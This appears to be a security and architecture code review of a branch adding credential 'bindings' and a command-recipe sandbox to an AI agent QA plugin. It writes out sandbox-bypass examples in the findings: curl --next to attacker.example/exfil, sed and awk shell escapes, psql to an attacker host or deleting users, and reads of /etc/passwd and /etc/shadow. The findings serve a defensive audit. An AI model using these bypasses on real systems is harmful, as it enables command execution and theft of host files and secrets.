# Code Review: `feaute/qa-need-info` branch

**Date:** 2026-05-25
**Branch:** `feaute/qa-need-info`
**Base:** `master`
**Scope:** 226 files, +22014/-2553. Two feature bodies: (1) QA preflight + NEED_INFO; (2) QA strict-orchestrator + native bindings.
**Build:** typecheck clean, tests green (446 root + workspaces).
**Verdict:** DO NOT MERGE. Two CRITICAL composite findings — bindings feature is end-to-end non-functional in production code, AND the recipe sandbox is bypassable in three distinct ways (verified live RCE).

---

## Headline

The auditors independently uncovered — and the reviewer verified directly via file reads + a live `validateRecipe()` test — that the rev3 "native bindings" architecture ships with **two structural gaps that make the entire feature inoperative**, alongside **four critical sandbox bypasses that allow arbitrary code execution from a malicious test plan**.

```
$ node -e "validateRecipe(\"awk 'BEGIN{system(\\\"echo PWNED\\\")}'\", '\$URL')"
{"status":"ok"}                                  <- validator says "safe"
                                                    bash will then execute PWNED
```

```
$ grep -rn "storePlan\|parseBindings(" src/
src/modules/qa/qa-run-state.ts:12:  storePlan(...) { ... }
src/modules/qa/binding-parser.ts:253:export function parseBindings(...) { ... }
                                                 <- zero production callers; only tests
```

```ts
// src/modules/coordinator/index.ts:119-127 - production dispatchParallel call
const results = await dispatchParallel({
  tasks: args.tasks,
  agentRegistry,
  specialist,
  signal: context.abort,
})                              // <- NO sessionAgentRegistry, scrubber, or parentSessionID
```

---

## CRITICAL composite findings

### [CRITICAL] COMP-001: Strict-orchestrator/bindings feature is non-functional in production
**Status:** ✅ Fixed (2026-05-26)

**ID:** COMP-001
**Combines:** SEC-001 + ARCH-001 + ARCH-002 + DOC-001..010
**Category:** Architecture

**Location:**
- `src/modules/coordinator/index.ts:119-127` — `dispatchParallel(...)` call site
- `src/modules/qa/index.ts:44, 102` — registry/hook instantiated but never written to in production
- `src/modules/qa/qa-run-state.ts:12` — `storePlan` never called
- `src/modules/qa/binding-parser.ts:253` — `parseBindings` never called
- `src/modules/qa/prompt-sections/overlay-setup.md:19-22` vs `core.md:47-52` — `kind: "binding_input"` emitted but rejected by core's allowlist

**Problem:** The "bindings" feature requires three things to work together: (a) Perun or a hook calls `parseBindings(planText) -> QaRunState.storePlan(parentID, ...)`, (b) the dispatch pipeline calls `sessionAgentRegistry.register(childID, "zmora-setup")` so the `shell.env` hook can identify the agent, (c) the scrubber runs on specialist outputs before they reach the report. **None of (a), (b), (c) happens in production.** The integration test (`tests/modules/qa/integration.test.ts:31, 55-64`) manually wires up `state.storePlan(...)` and `registry.register(...)` directly, masking the gap from CI. In production:
1. `execute_recipe({binding_name: "QA_BIND_TOKEN"})` always returns `{status: "unknown_binding"}` (state is empty).
2. `shell.env` hook's `registry.lookup(sessionID)` always returns `undefined` -> no env injection.
3. Specialist stdout/stderr is never scrubbed for known secret values.
4. Even if (1)-(3) worked, the core prompt's `kind` allowlist would reject `binding_input` as invalid.

**Impact:** The feature that was the entire goal of this branch (mint credentials safely via deterministic recipes, inject into Zmora's bash env, scrub any leakage) is dead code. Tests passing because they bypass the broken wiring is exactly the failure mode `superpowers:subagent-driven-development` is supposed to catch in the spec-compliance reviewer phase.

**Remediation (block merge):**
1. Add a `parse_plan` plugin tool (Perun-only) or a `dispatch_parallel`-side hook that invokes `parseBindings -> state.storePlan` before any zmora-setup task runs.
2. In `coordinator/index.ts:119-127`, pass `sessionAgentRegistry`, `scrubber`, and `parentSessionID: context.sessionID` to `dispatchParallel(...)`. Source the registry/scrubber from the QA plugin via a shared singleton (`src/modules/_shared/dispatch-extensions.ts`) — this fixes ARCH-002 (layer inversion) too.
3. Extend `core.md` `kind` allowlist with `binding_input`.
4. Add an integration test that constructs both plugins via their factory functions and asserts the full dispatch->storePlan->registry->shell.env->scrub pipeline works without test-only setup.

---

### [CRITICAL] COMP-002: Recipe sandbox advertises layered defense; ships one porous allowlist
**Status:** ✅ Fixed (2026-05-26)

**ID:** COMP-002
**Combines:** SEC-002 + SEC-003 + SEC-004 + SEC-005
**Category:** Security

**Location:** `src/modules/qa/binding-parser.ts:20-33, 51-75, 148-159, 213-226`

**Verified live:** `validateRecipe("awk 'BEGIN{system(\"echo PWNED\")}'", "$URL")` returns `{status: "ok"}`.

**Four independent bypasses:**

| # | Bypass | File:Line | Why |
|---|---|---|---|
| SEC-002 | `curl --next` chains a second request to attacker host | `binding-parser.ts:148-159` (extractCurlURL returns first URL only) | `--next` missing from `CURL_FORBIDDEN_FLAGS` |
| SEC-003 | `awk 'BEGIN{system(...)}'` / `sed 'e cmd'` execute arbitrary shell | `binding-parser.ts:20-33` (ALLOWED_COMMANDS) | awk/sed have shell-exec primitives that regex can't catch |
| SEC-004 | `psql "postgres://attacker..."` / destructive SQL — no validation | `binding-parser.ts:213` (`if (firstWord(cmd) !== "curl") continue`) | egress URL check only runs for curl |
| SEC-005 | `tail /etc/passwd` exfils host files | `binding-parser.ts:20-33` (no path confinement on file-readers) | tail/head/cut/grep/tr accept absolute paths |

Combined with the recipe executor in `src/modules/qa/index.ts:71-97` that runs `spawn("bash", ["-c", cmd], { env: { ...process.env, ...composedEnv } })` — full process env (`ANTHROPIC_API_KEY`, `AWS_*`, `KUBECONFIG`, etc.) is exposed to any sandbox escape.

**Impact:** A malicious test plan committed to a repo achieves full arbitrary command execution on the OpenCode user's machine with the OpenCode process's privileges. This bypasses every other safety control in this branch (Perun's strict-orchestrator rule, the QA_BIND_* name denylist, the Secret wrapper, the scrubber).

**Remediation (block merge):**
1. Add `--next` and `--url` to `CURL_FORBIDDEN_FLAGS`.
2. Remove `awk` and `sed` from `ALLOWED_COMMANDS`. Replace with `jq`/`cut`/`grep` in any example/docs.
3. Apply egress-host validation to `psql`/`sqlite3`/any DSN-bearing command. Forbid sqlite3 `.read`/`.shell`/`.system` dot-commands.
4. Restrict file-readers to `./*` paths or `/dev/null|/dev/stdin|-`.
5. Cap recipe text length at e.g. 16 KB (SEC-008, regex DoS).
6. Build a minimal child env via allowlist instead of `{ ...process.env, ... }` (LOW item below).

---

## Individual findings

### [CRITICAL] SEC-001: `dispatchParallel` not wired with registry+scrubber+parentSessionID
**Status:** ✅ Fixed (2026-05-26)

**ID:** SEC-001
**Location:** `src/modules/coordinator/index.ts:119-127`
**Category:** Security
**OWASP:** A09:2025, A05:2025
**CWE:** CWE-532, CWE-200
**Effort:** medium

**Problem:** See COMP-001. Production call site omits the three optional parameters that make the bindings feature functional.

**Impact:** Specialist outputs never scrubbed; `shell.env` hook never injects.

**Remediation:** See COMP-001.

---

### [CRITICAL] SEC-002: Recipe sandbox bypass via `curl --next`
**Status:** ✅ Fixed (2026-05-26)

**ID:** SEC-002
**Location:** `src/modules/qa/binding-parser.ts:51-75, 148-159`
**Category:** Security
**OWASP:** A06:2025, A10:2025
**CWE:** CWE-918 (SSRF), CWE-200
**Effort:** easy

**Problem:** `curl "$URL" --next "http://attacker.example/exfil"` passes `parseBindings` end-to-end. `extractCurlURL` returns only the first URL; the second URL after `--next` reaches the network without host validation.

**Remediation:**
```ts
const CURL_FORBIDDEN_FLAGS = [
  // ... existing
  { pattern: /(?:^|\s)--next(?:\s|$)/, label: "--next (chains additional requests)" },
  { pattern: /(?:^|\s)--url(?:\s|=)/, label: "--url (alternate URL specification)" },
]
// Plus: require exactly ONE non-flag URL token. See COMP-002.
```

---

### [CRITICAL] SEC-003: Recipe sandbox bypass via `awk`/`sed` shell-exec primitives
**Status:** ✅ Fixed (2026-05-26)

**ID:** SEC-003
**Location:** `src/modules/qa/binding-parser.ts:20-33` (ALLOWED_COMMANDS), executed at `src/modules/qa/index.ts:78` (`spawn("bash", ["-c", cmd], ...)`)
**Category:** Security
**OWASP:** A05:2025 (Injection)
**CWE:** CWE-78 (OS Command Injection), CWE-94
**Effort:** trivial

**Problem:** **Verified live.** `awk 'BEGIN{system("echo PWNED")}'` and `sed 'e curl http://evil'` pass validation. awk/sed have shell-exec built-ins that no regex can safely subset.

**Remediation:**
```ts
const ALLOWED_COMMANDS = new Set([
  "curl", "psql", "sqlite3", "jq",
  // REMOVED: "sed", "awk"
  "grep", "cut", "head", "tail", "tr", "printf",
])
```

---

### [CRITICAL] SEC-004: `psql`/`sqlite3` have no host/path validation
**Status:** ✅ Fixed (2026-05-26)

**ID:** SEC-004
**Location:** `src/modules/qa/binding-parser.ts:212-226`
**Category:** Security
**OWASP:** A06:2025, A05:2025
**CWE:** CWE-918, CWE-89
**Effort:** medium

**Problem:** Line 213 skips egress check for any command other than curl. `psql "postgres://attacker.example/db" -c "select 1"` passes; so does `psql "postgres://postgres@localhost:5432/production" -c "DELETE FROM users"`. `sqlite3 :memory: ".read /etc/shadow"` reads filesystem files.

**Remediation:** Either drop `psql`/`sqlite3` entirely (recommended — recipes can use `curl` against the API endpoint) or extend the egress check to all DSN-bearing commands and reject sqlite3 dot-commands `.shell`/`.system`/`.read`.

---

### [HIGH] SEC-005: File-readers accept arbitrary absolute paths
**Status:** ✅ Fixed (2026-05-26)

**ID:** SEC-005
**Location:** `src/modules/qa/binding-parser.ts:20-33`
**Category:** Security
**OWASP:** A01:2025
**CWE:** CWE-22 (Path Traversal)
**Effort:** easy

**Problem:** `tail /etc/passwd`, `head /etc/shadow`, `cut -d: -f1 /etc/passwd` all pass validation. The recipe's stdout becomes the binding value, exposing host file contents.

**Remediation:** Restrict file arguments to `./*` paths or `/dev/null|/dev/stdin|-`:
```ts
const SAFE_FILE_RE = /^(?:\.{1,2}\/[^\s]+|\/dev\/null|\/dev\/stdin|-)$/
```

---

### [HIGH] SEC-006: `clearParent` purges pinned snapshots, breaks contract
**Status:** ✅ Fixed (2026-05-26)

**ID:** SEC-006
**Location:** `src/modules/qa/bindings-store.ts:198-212`
**Category:** Security
**CWE:** CWE-672

**Problem:** Documented as a hard reset; deletes entries regardless of pin state. Currently moot because pin/release has no production caller (ARCH-004), but once wired this would cause race-corruption.

**Remediation:** Either skip pinned entries in `clearParent`, or throw when called with active pins.

---

### [HIGH] SEC-007: User-paste denylist missing common credential prefixes
**Status:** ✅ Fixed (2026-05-26)

**ID:** SEC-007
**Location:** `src/modules/qa/bindings-store.ts:42`
**Category:** Security
**CWE:** CWE-15

**Problem:** `DENYLIST_PREFIXES = ["AWS_", "GIT_SSH_", "GCP_", "AZURE_"]` misses `ANTHROPIC_*`, `OPENAI_*`, `GH_TOKEN`, `GITHUB_TOKEN`, `DATABASE_URL`, `SUPABASE_*`, `KUBECONFIG`, `OP_SESSION_*`. A malicious plan can ask the user to paste under a plausible-looking name and exfil to declared (attacker-controlled) Egress.

**Remediation:** Expand denylist; consider requiring `TEST_*` allow-prefix for user-paste in addition to the existing `QA_BIND_*` requirement for minted.

---

### [HIGH] SEC-008: Recipe text has no length cap; regex DoS
**Status:** ✅ Fixed (2026-05-26)

**ID:** SEC-008
**Location:** `src/modules/qa/binding-parser.ts:168-229`
**Category:** Security
**CWE:** CWE-1333

**Problem:** No upper bound on recipe length. A 350KB recipe with thousands of `-H X:Y` flags makes `parseBindings` synchronous CPU-bound. With up to 32 bindings × any size, plan-parse can stall the coordinator.

**Remediation:** `if (recipe.length > 16 * 1024) return error`.

---

### [HIGH] ARCH-001: Bindings feature has no production caller chain
**Status:** ✅ Fixed (2026-05-26)

**ID:** ARCH-001
**Location:** `src/modules/qa/qa-run-state.ts:12` (storePlan), `src/modules/qa/binding-parser.ts:253` (parseBindings)
**Category:** Architecture
**Effort:** medium

**Problem:** See COMP-001. The two functions are tested but never reachable from a real `/run-qa` invocation.

**Remediation:** See COMP-001.

---

### [HIGH] ARCH-002: Coordinator imports type from QA module (layer inversion)
**Status:** ✅ Fixed (2026-05-26)

**ID:** ARCH-002
**Location:** `src/modules/coordinator/dispatch.ts:1`
**Category:** Architecture

**Problem:** `import type { SessionAgentRegistry } from "../qa/shell-env-hook.js"` — even type-only, this binds the general-purpose dispatch primitive to a feature module.

**Remediation:** Move `SessionAgentRegistry` to `src/modules/_shared/session-agent-registry.ts`. Both QA and coordinator import from there.

---

### [HIGH] ARCH-003: SessionAgentRegistry never cleaned for child sessions (downgraded from CRITICAL)
**Status:** ✅ Fixed (2026-05-26)

**ID:** ARCH-003
**Location:** `src/modules/qa/index.ts:224-241`
**Category:** Architecture
**CWE:** CWE-401

**Problem:** `session.deleted` cleanup only operates on the parent ID. Child (zmora-*) session entries persist until the parent session is also deleted — but in long-lived OpenCode processes, child sessions die independently. Once SEC-001 is fixed, this becomes a long-lived credential mapping store.

**Remediation:** Always `registry.unregister(deletedID)` regardless of whether deleted ID is parent or child:
```ts
event: async ({ event }) => {
  if (event.type !== "session.deleted") return
  const deletedID = event.properties?.info?.id
  if (typeof deletedID !== "string" || deletedID.length === 0) return
  registry.unregister(deletedID)   // always - works for parent OR child
  store.clearParent(deletedID)     // no-op if not a parent
  state.clearRun(deletedID)
  parentIDCache.delete(deletedID)
  for (const [childID, parentID] of parentIDCache.entries()) {
    if (parentID === deletedID) parentIDCache.delete(childID)
  }
}
```

---

### [HIGH] ARCH-004: Snapshot pin/release infrastructure dead in production
**Status:** ✅ Fixed (2026-05-26)

**ID:** ARCH-004
**Location:** `src/modules/qa/bindings-store.ts:84-121`, `src/modules/qa/scrubber.ts:18-25`
**Category:** Architecture / Dead Code

**Problem:** `pinSnapshot`/`releaseSnapshot` exist as race-safe-read defense. `scrubber.ts:22` accepts an optional `BindingSnapshot` — but no caller passes one. Once SEC-001 is fixed and the dispatch scrubber actually runs, it will read live (racy) state.

**Remediation:** In the dispatch scrubber callback, pin at dispatch start and release on task complete. Wire `snapshot` argument through.

---

### [HIGH] DOC-001: `src/commands/run-qa.md` advertises 50-task cap (real cap is 4)
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-001
**Location:** `src/commands/run-qa.md:86, 119`
**Category:** Documentation

**Remediation:** Change "50-task cap" -> "max 4 tasks per call; Perun chunks larger waves". Rebuild `dist/`.

---

### [HIGH] DOC-002: `AGENTS.md` coordinator row says "cap 50" and omits `compute_waves`
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-002
**Location:** `AGENTS.md:18`
**Category:** Documentation

**Remediation:** Update coordinator row: "Registers `dispatch_parallel` (worker pool, concurrency 4, cap 4 — chunk larger workloads), `assign_issue_ids`, and `compute_waves` tools alongside the `@perun` primary agent."

---

### [HIGH] DOC-003: `AGENTS.md` QA row says "two variants" (now three: fe/be/setup)
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-003
**Location:** `AGENTS.md:16`
**Category:** Documentation

**Remediation:** Update QA row to reflect three variants and call out `execute_recipe`/`record_input` plugin tools, the `shell.env` hook, the bindings store/scrubber, and the periodic TTL sweep.

---

### [HIGH] DOC-004: `docs/configuring-agents.md` does not mention `zmora-setup`
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-004
**Location:** `docs/configuring-agents.md:64-66`
**Category:** Documentation

**Remediation:** Update "Available agents" table to mention three variants share the `zmora` model entry.

---

### [HIGH] DOC-005: `docs/plugins/qa.md` entirely silent on bindings / strict-orchestrator
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-005
**Location:** `docs/plugins/qa.md` (Architecture, Setup, Limitations, Project Structure)
**Category:** Documentation

**Problem:** The primary user-facing QA doc describes the pre-bindings world. No mention of `**Bindings:**` subsection, recipe sandbox rules, `zmora-setup` variant, `execute_recipe`/`record_input` tools, shell.env hook, resource caps, or scrubber.

**Remediation:** Add top-level "Bindings (dynamic credential provisioning)" section covering plan-format extension, recipe sandbox rules, the `zmora-setup` variant, the mid-run dialog flow, resource caps (32/256/4 KB/1 h TTL), and updated Project Structure listing.

---

### [HIGH] DOC-006: `docs/plugins/coordinator.md` missing strict-orchestrator rule + `record_input` + `zmora-setup`
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-006
**Location:** `docs/plugins/coordinator.md:117-150`
**Category:** Documentation

**Remediation:** (1) Add `record_input` to @perun allowed tools list. (2) Add a "Strict-orchestrator hard rule" subsection. (3) Add a `zmora-setup` row to the Specialists table. (4) Extend the Security model table with rows for `AgentConfig.tools`, recipe AST validation, `record_input` denylist, `Secret` wrapper, bindings caps + TTL, `shell.env` hook scope, strict-orchestrator hard rule.

---

### [MEDIUM] MAINT-001: Duplicate `BindingType` symbol in two files
**Status:** ✅ Fixed (2026-05-26)

**ID:** MAINT-001
**Location:** `src/modules/qa/bindings-store.ts:3` and `src/modules/qa/binding-parser.ts:1`
**Category:** Maintainability
**Effort:** trivial

**Remediation:** Re-export from one canonical home (`bindings-store.ts`).

---

### [MEDIUM] MAINT-002: `incrementDialogRound`/`getDialogRound` are dead in production (downgraded from HIGH)
**Status:** ✅ Fixed (2026-05-26)

**ID:** MAINT-002
**Location:** `src/modules/qa/qa-run-state.ts:25-37`
**Category:** Maintainability

**Problem:** The "round i/3" bounding documented in perun.md is implemented as prompt instructions only, not via this state object. Either wire it (preferred — trust deterministic code over LLM counting) or delete.

---

### [MEDIUM] MAINT-003: Non-null assertion in `qa/index.ts:148`
**Status:** ✅ Fixed (2026-05-26)

**ID:** MAINT-003
**Location:** `src/modules/qa/index.ts:148`
**Category:** Maintainability
**Effort:** trivial

**Problem:** `config.agent[`zmora-${stack}`]!.model = zmoraModel` — project doctrine forbids `!`.

**Remediation:** Rewrite as a local binding with `if undefined continue`.

---

### [MEDIUM] PERF-001: Bash timeout doesn't kill child process (downgraded from HIGH)
**Status:** ✅ Fixed (2026-05-26)

**ID:** PERF-001
**Location:** `src/modules/qa/execute-recipe.ts:72-78`, `src/modules/qa/index.ts:71-97`
**Category:** Performance
**CWE:** CWE-404

**Problem:** `Promise.race(setTimeout, runBash)` resolves with `exitCode: 124` on timeout but the underlying bash continues running. Combined with the timer also not being `clearTimeout`'d on the happy path.

**Remediation:** Capture the `ChildProcess`, kill on timeout via `controller.abort()`, clearTimeout on resolve.

---

### [MEDIUM] MAINT-004: Stderr_tail truncated BEFORE scrubbing
**Status:** ✅ Fixed (2026-05-26)

**ID:** MAINT-004
**Location:** `src/modules/qa/execute-recipe.ts:80`
**Category:** Maintainability

**Problem:** `scrubSecrets(result.stderr.slice(-200), ...)` slices first then scrubs. A secret at byte offset `len-250..len-50` survives partially in the tail.

**Remediation:** `scrubSecrets(result.stderr, ...).slice(-200)`.

---

### [MEDIUM] MAINT-005: Scrubber entropy threshold comment/code mismatch
**Status:** ✅ Fixed (2026-05-26)

**ID:** MAINT-005
**Location:** `src/modules/qa/scrubber.ts:4, 44`
**Category:** Maintainability

**Problem:** Code `ENTROPY_MIN = 3.8`; comment says `>=3.5`.

**Remediation:** Align comment.

---

### [MEDIUM] MAINT-006: ESLint error in `tests/modules/coordinator/dispatch.test.ts:766`
**Status:** ✅ Fixed (2026-05-26)

**ID:** MAINT-006
**Location:** `tests/modules/coordinator/dispatch.test.ts:766`
**Category:** Maintainability

**Problem:** Unused `_parent` parameter trips ESLint.

**Remediation:** Configure `argsIgnorePattern: '^_'` in eslint.config.js or remove the parameter.

---

### [MEDIUM] MAINT-007: Recipe deindent assumes exactly 4 spaces
**Status:** ✅ Fixed (2026-05-26)

**ID:** MAINT-007
**Location:** `src/modules/qa/binding-parser.ts:332`
**Category:** Maintainability

**Problem:** `l.replace(/^    /, "")` — silently broken for tab-indented or 2-space recipes.

**Remediation:** Use textwrap.dedent equivalent (common-prefix strip).

---

### [MEDIUM] DOC-007: `test-plan-format` SKILL silent on `**Bindings:**` subsection
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-007
**Location:** `src/skills/qa/test-plan-format/SKILL.md:104-113`
**Category:** Documentation

**Remediation:** Add a "Bindings (dynamic credentials)" subsection with the markdown shape, name pattern, recipe sandbox summary, and synthesised SETUP-NN scenarios.

---

### [MEDIUM] DOC-008: qa.md ("never paste credentials") contradicts perun.md ("Reply with the value(s) directly in chat")
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-008
**Location:** `docs/plugins/qa.md:164-171` vs `src/agents/perun.md:322-324`
**Category:** Documentation / User Safety

**Problem:** Two user-facing docs give opposite instructions for the same NEED_INFO mid-run flow. Combined with SEC-001 (scrubber not wired), a user following the perun.md template pastes credentials that then propagate to logs/reports verbatim.

**Remediation:** Reconcile both docs to a single canonical NEED_INFO flow; make CRIT-S1's scrubber wiring a precondition for re-enabling any "paste in chat" guidance.

---

### [MEDIUM] DOC-009: Core prompt `kind` allowlist doesn't include `binding_input`
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-009
**Location:** `src/modules/qa/prompt-sections/core.md:47-52` vs `overlay-setup.md:19-22`
**Category:** Documentation

**Problem:** Setup-Zmora is instructed to emit `kind: "binding_input"` but the core prompt's allowed-kinds list doesn't include it. A compliant LLM would refuse to emit it.

**Remediation:** Extend `core.md` `kind` allowlist with `binding_input`.

---

### [MEDIUM] DOC-010: `docs/plugins/pantheon.md` silent on the new harness-level concerns
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-010
**Location:** `docs/plugins/pantheon.md`
**Category:** Documentation

**Remediation:** Add a short "Other harness concerns" pointer listing the QA plugin's `shell.env` hook + bindings store, or rescope pantheon.md to notifications-only.

---

### [LOW] DOC-011: `AGENTS.md` missing `src/modules/_shared/` row
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-011
**Location:** `AGENTS.md:5-22`
**Category:** Documentation

**Remediation:** Add a row for `src/modules/_shared/` describing `loadModuleAsset` and its consumers.

---

### [LOW] DOC-012: spec promises three-layer enforcement; ships two layers
**Status:** ✅ Fixed (2026-05-26)

**ID:** DOC-012
**Location:** `docs/superpowers/specs/2026-05-25-qa-strict-orchestrator-and-bindings-design.md` §4.1
**Category:** Documentation

**Problem:** Spec describes a `tool.execute.before` runtime guard as defense-in-depth, but no such guard is implemented. Shipped enforcement is `AgentConfig.tools` (primary gate) + prompt discipline, not the three-layer model.

**Remediation:** Either implement the missing runtime hook layer or update the spec to honestly describe the two layers actually in place.

---

## Verification Summary

**Method:** Cross-domain correlation (Cross-Verifier) + adversarial review (Challenger) + direct live verification of three CRITICAL claims by the reviewer.

| Metric | Count |
|--------|-------|
| Findings raised by auditors | 39 |
| Findings live-verified by reviewer | 3 (SEC-001, SEC-003, ARCH-001) |
| Severity downgrades by Challenger | 4 (HIGH-S2 -> PERF-001 MEDIUM, CRIT-Q3 -> ARCH-003 HIGH, HIGH-Q4/Q5 -> MAINT-002 MEDIUM + ARCH-004 still HIGH) |
| Composite findings added by Cross-Verifier | 3 (COMP-001..003) |
| Final tally | 4 CRITICAL · 11 HIGH · 12 MEDIUM · 2 LOW |

### Cross-Analysis (Security <-> Quality <-> Documentation)
- **COMP-001 (CRITICAL)** weaves SEC-001 + ARCH-001..002 + DOC-005..009: the feature is dead AND the docs say it works AND tests bypass the gap. Single release-blocker.
- **COMP-002 (CRITICAL)** weaves SEC-002..005 + DOC-005: sandbox layers are advertised in docs that don't yet exist; verified live RCE.
- **COMP-003 (HIGH/MEDIUM, surfaced as DOC-008)** ties DOC-008 to SEC-001: contradictory credential-handling docs with no runtime scrubber backstop.

### Challenged Findings
- HIGH-S2 (timer leak) -> **PERF-001 MEDIUM** — delayed shutdown class, not exploit vector.
- CRIT-Q3 (registry child leak) -> **ARCH-003 HIGH** — bounded growth, not data loss.
- HIGH-Q4/Q5 (dead methods) -> **MAINT-002 MEDIUM** — quality debt, not functional risk. ARCH-004 kept at HIGH because SEC-006 depends on it.
- All four security CRITICALs **CONFIRMED**.

---

## Recommendations (prioritized)

### Block merge — fix BEFORE any push
1. **Wire `dispatchParallel`** to receive `sessionAgentRegistry`, `scrubber`, `parentSessionID` from QA plugin via shared singleton (SEC-001).
2. **Add a `parse_plan` tool or hook** that invokes `parseBindings -> state.storePlan` (ARCH-001).
3. **Patch sandbox bypasses:** add `--next`/`--url` to forbidden flags; remove `awk`/`sed`; egress-check `psql`/`sqlite3`; path-confine file-readers (SEC-002..005).
4. **Symmetric child-session cleanup** in `session.deleted` handler (ARCH-003).
5. **Add `binding_input` to core.md `kind` allowlist** (DOC-009).
6. **Reconcile qa.md <-> perun.md** credential paste guidance (DOC-008).
7. **Add a full-plugin integration test** that does NOT manually pre-register bindings.

### Before next release
8. Move `SessionAgentRegistry` to `_shared/` (ARCH-002).
9. Wire snapshot pin/release through dispatch scrubber (ARCH-004 + SEC-006).
10. Fix `Promise.race` timer leak (PERF-001).
11. Update `AGENTS.md`, `docs/plugins/qa.md`, `docs/plugins/coordinator.md`, `src/commands/run-qa.md` cap to 4 (DOC-001..006).
12. De-duplicate `BindingType` (MAINT-001).
13. Cap recipe length + minimal child env (SEC-008 + LOW item).

### Next sprint backlog
14. Decide: wire OR delete `QaRunState.incrementDialogRound` (MAINT-002).
15. Restructure `perun.md` Workflow 1 section.
16. Fix `binding-parser.ts:332` deindent (MAINT-007).
17. Eliminate `!` non-null assertion (MAINT-003).
18. Align scrubber entropy comment (MAINT-005).
19. Fix `dispatch.test.ts:766` ESLint error (MAINT-006).

---

## Files Referenced

| Module | File |
|---|---|
| QA store | `src/modules/qa/bindings-store.ts` |
| QA parser | `src/modules/qa/binding-parser.ts` |
| QA recipe exec | `src/modules/qa/execute-recipe.ts` |
| QA scrubber | `src/modules/qa/scrubber.ts` |
| QA hook | `src/modules/qa/shell-env-hook.ts` |
| QA wiring | `src/modules/qa/index.ts` |
| Coordinator wiring | `src/modules/coordinator/index.ts` |
| Dispatch | `src/modules/coordinator/dispatch.ts` |
| Perun prompt | `src/agents/perun.md` |
| Core/Setup prompts | `src/modules/qa/prompt-sections/{core,overlay-setup}.md` |
| Docs | `AGENTS.md`, `docs/plugins/{qa,coordinator,pantheon}.md`, `docs/configuring-agents.md`, `src/commands/run-qa.md`, `src/skills/qa/test-plan-format/SKILL.md` |
